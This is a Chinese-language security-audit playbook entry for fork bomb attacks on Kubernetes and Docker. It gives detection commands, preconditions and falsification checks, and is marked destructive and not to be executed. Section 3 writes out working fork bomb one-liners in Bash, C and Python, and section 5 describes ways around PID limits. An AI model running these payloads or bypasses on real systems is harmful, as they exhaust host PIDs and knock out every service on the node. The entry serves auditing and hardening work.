---
source: manual
confidence: high
platforms: [k8s, docker]
required_tools: []
execution_contexts: [L0, L1, L3]
max_verification_level: L3
destructive: true
mapped_attack_surfaces: [AS-5.2]
mapped_compliance_families: [Pod启动安全]
---

# Fork Bomb

## 1. 前置条件

- 容器为特权容器或具有 CAP_SYS_RESOURCE capability
- 容器未配置 PID 限制（`spec.containers[].resources.limits` 无 pid 限制）
- 节点未配置 PID 限制（`--pod-max-pids` 或 cgroup pids.max 过大）
- 容器内可执行 shell 或编译程序

## 2. 探测命令

- [L0] `kubectl get pods -A -o json | jq '.items[] | select(.spec.securityContext.privileged==true or .spec.containers[].securityContext.privileged==true) | {name:.metadata.name, namespace:.metadata.namespace}'` → 期望：发现特权 Pod
- [L0] `kubectl get pods -A -o json | jq '.items[] | select(.spec.containers[].resources.limits == null or (.spec.containers[].resources.limits.pid == null)) | {name:.metadata.name, namespace:.metadata.namespace}'` → 期望：发现无 PID 限制的 Pod
- [L0] `docker inspect <container> --format '{{.HostConfig.PidsLimit}}'` → 期望：返回 0（无限制）
- [L1] `kubectl exec <pod> -n <ns> -- cat /proc/1/cgroup | grep pids` → 期望：确认 cgroup PID 控制器限制
- [L1] `kubectl exec <pod> -n <ns> -- sh -c 'cat /sys/fs/cgroup/pids/pids.max 2>/dev/null || cat /sys/fs/cgroup/pids.max 2>/dev/null || echo "no pids cgroup"'` → 期望：显示无限制或极大值

## 3. 攻击验证

- [L3] 条件验证—⚠️ 不可安全复现，实际执行会导致宿主机 PID 耗尽
  前置条件满足证明：
  - ✅ kubectl get pod <pod> -o jsonpath='{.spec.securityContext.privileged}' = true 或 capabilities 含 CAP_SYS_RESOURCE
  - ✅ kubectl get pod <pod> -o jsonpath='{.spec.containers[0].resources.limits.pid}' = 空 → 无 PID 限制
  - ✅ docker inspect <container> PidsLimit = 0 → 无 PID 限制
  理论风险：特权容器 + 无 PID 限制 = fork bomb 可耗尽宿主机 PID 资源
  POC 步骤（⚠️ 理论推导，实际执行会导致服务不可用）：
  - Bash fork bomb：`:(){ :|:& };:` — 无限 fork 耗尽 PID
  - C fork bomb：`while(1) fork();` — 更高效的进程创建
  - Python fork bomb：`import os; while True: os.fork()` — Python 实现
  不可安全复现原因：实际执行会导致宿主机所有进程无法创建，影响生产环境可用性

## 4. 差分证明

- 攻击前 [L0]: 节点进程数正常（`ps aux | wc -l`）
- 理论推导 [L3]:
  - 特权容器 + 无 PID 限制 → fork bomb 可耗尽宿主机 PID 表
  - PID 耗尽后宿主机无法创建新进程 → 所有服务不可用
  - 即使容器有 cgroup 限制，特权容器可修改自身 cgroup 限制绕过

## 5. 绕过策略

- 若有 PID 限制但容器特权：使用 `CAP_SYS_RESOURCE` 修改 pids.max 绕过限制
- 若容器内无 shell：上传编译的 ELF 二进制执行 fork bomb
- 若 cgroup v2 限制但 seccomp 未过滤 fork/clone 系统调用：直接 fork 绕过

## 6. 证伪条件

- [L0] 所有 Pod 均配置 `resources.limits.pid` → 证伪
- [L0] 容器非特权且无 CAP_SYS_RESOURCE → 证伪（无法绕过 PID 限制）
- [L0] `--pod-max-pids` 在 kubelet 中配置 → 证伪（硬性 PID 限制）
- [L1] `/sys/fs/cgroup/pids.max` 设置合理上限（如 1024 或 4096）→ 证伪
- [L0] Seccomp 配置阻止 fork/clone 系统调用 → 证伪

## 7. 审批级别

Level 1：只读命令（检查资源限制、PID 限制）自动通过。
Level 3：不可安全复现，仅条件验证。
destructive: true — 最高验证层级 L3（条件验证），绝不实际执行 fork bomb

## 8. MITRE ATT&CK

T1499.004 - Endpoint Denial of Service: Application or System Exploitation（Fork Bomb 导致 PID 耗尽）